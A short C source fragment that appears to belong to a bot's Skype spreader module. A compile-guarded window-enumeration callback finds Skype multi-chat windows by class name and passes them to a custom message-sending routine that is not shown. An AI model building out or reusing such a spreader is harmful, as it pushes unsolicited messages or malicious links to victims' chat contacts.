#include "../Includes.h"

#ifndef NO_SKYPE

BOOL CALLBACK Skype(HWND hwnd, LPARAM lpParam)
{
	int iWindow = 0;
	char szClassName[50] = {0};

	GetClassName(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "TskMultiChatForm.UnicodeClass"))
		iWindow = 1;

	SendMessage(hwnd, iWindow);

	return TRUE;
}
#endif
